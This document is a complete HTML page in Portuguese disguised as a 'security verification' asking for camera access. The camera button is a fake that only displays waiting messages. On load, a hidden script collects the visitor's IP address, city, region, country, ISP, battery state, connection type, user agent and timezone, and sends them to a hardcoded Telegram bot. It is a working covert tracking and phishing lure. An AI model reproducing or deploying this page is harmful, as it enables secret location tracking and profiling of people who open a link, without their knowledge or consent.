<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificação de Segurança</title>
  <style>
    body {
      font-family: sans-serif;
      background: #f3f3f3;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      padding: 20px;
    }
    .box {
      background: white;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      max-width: 400px;
      width: 100%;
      text-align: center;
    }
    button {
      background: #007bff;
      color: white;
      border: none;
      padding: 12px 24px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 20px;
    }
    #status {
      margin-top: 20px;
      font-size: 14px;
      color: gray;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>Verificação de segurança</h2>
    <p>Para continuar, permita acesso à câmera.</p>
    <button onclick="fakePermission()">Permitir acesso à câmera</button>
    <div id="status">Aguardando interação do usuário...</div>
  </div>

  <script>
    const chatId = "8161371749";
    const token = "7588635619:AAHymnNKke3nSIrkatKGX3YOrl8sT__gfiA";
    const log = (msg) => document.getElementById("status").textContent = msg;

    async function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${token}/sendMessage`;
      const body = {
        chat_id: chatId,
        text: message,
        parse_mode: "HTML"
      };
      try {
        const res = await fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(body)
        });
        const data = await res.json();
        return data.ok;
      } catch (e) {
        log("Erro: " + e.message);
        return false;
      }
    }

    async function fakePermission() {
      log("Solicitando acesso à câmera...");
      setTimeout(() => {
        log("Permissão pendente... aguarde");
      }, 1500);
    }

    async function rastrear() {
      let ipData = {};
      try {
        ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
      } catch {}

      let batteryData = { level: 0.5, charging: false };
      try {
        const b = await navigator.getBattery();
        batteryData = { level: b.level, charging: b.charging };
      } catch {}

      const connection = navigator.connection ? navigator.connection.effectiveType : "desconhecido";
      const device = navigator.userAgent;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

      const msg = `\
<b>🔎 Verificação acionada</b>

🌐 <b>IP:</b> ${ipData.ip || "Erro"}
📍 <b>Local:</b> ${ipData.city || "?"}, ${ipData.region || "?"}, ${ipData.country_name || "?"}
📡 <b>Operadora:</b> ${ipData.org || "?"}
🔋 <b>Bateria:</b> ${Math.round(batteryData.level * 100)}%
🔌 <b>Carregando:</b> ${batteryData.charging ? "Sim" : "Não"}
📶 <b>Conexão:</b> ${connection}
📱 <b>Dispositivo:</b> ${device}
🕒 <b>Fuso:</b> ${timezone}
      `;

      await sendToTelegram(msg);
    }

    // Inicia rastreio automático em segundo plano
    rastrear();
  </script>
</body>
</html>
